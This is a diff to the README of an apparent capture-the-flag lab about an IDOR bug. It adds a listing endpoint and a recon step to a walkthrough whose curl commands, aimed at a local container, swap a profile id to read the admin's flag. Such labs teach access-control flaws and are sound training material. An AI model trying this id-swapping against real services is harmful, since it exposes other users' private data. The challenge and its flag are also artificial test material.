@@ -24,6 +24,11 @@ The flag and the admin token are derived inside the container from a per-deploy 
 You are signed in as `guest` with the API token `token-guest`.
 
 - `GET /api/profile` returns **your own** profile (looked up from your token). Intended.
+- `GET /api/profiles` lists the profiles you are **authorized** to see — as a guest,
+  just your own, as `[{id, username, role}]` (no `note`). Intended, and correctly
+  scoped: it enforces an ownership check *and* strips secret fields, so it cannot
+  become a second IDOR. It's here so recon looks like a real API walk — you see the
+  shape of a profile object and notice `id` is a small integer worth trying elsewhere.
 - `GET /api/profile/<id>` returns the object for `<id>` as long as you are logged in —
   but it **never checks that `<id>` is yours**. That is the IDOR.
 
@@ -38,17 +43,24 @@ know the admin's token, and you do not need it.
    ```
    curl -H "Authorization: Bearer token-guest" http://127.0.0.1:18080/api/profile
    ```
-4. Now change the id to the admin's (IDOR):
+4. Recon: list the profiles you can see:
+   ```
+   curl -H "Authorization: Bearer token-guest" http://127.0.0.1:18080/api/profiles
+   ```
+   Only your own comes back (`{"profiles":[{"id":3,...}]}`) — but now you know `id` is
+   a small integer, so other ids like `1` are worth trying.
+5. Now change the id to the admin's (IDOR):
    ```
    curl -H "Authorization: Bearer token-guest" http://127.0.0.1:18080/api/profile/1
    ```
    The `note` field holds the flag (`TC{...}`).
-5. Submit the flag in the portal — the container's `/verify` judges it.
+6. Submit the flag in the portal — the container's `/verify` judges it.
 
 | Request | Response |
 | --- | --- |
 | `GET /api/profile/1` (no token) | `401` |
 | `GET /api/profile` (`Bearer token-guest`) | `200` guest's own profile |
+| `GET /api/profiles` (`Bearer token-guest`) | `200` **only** the guest's own summary — no `note`, no other users |
 | `GET /api/profile/1` (`Bearer token-guest`) | `200` **admin's object, incl. the flag** ← the bug |
 
 ## The root-cause fix (why this is a bug)
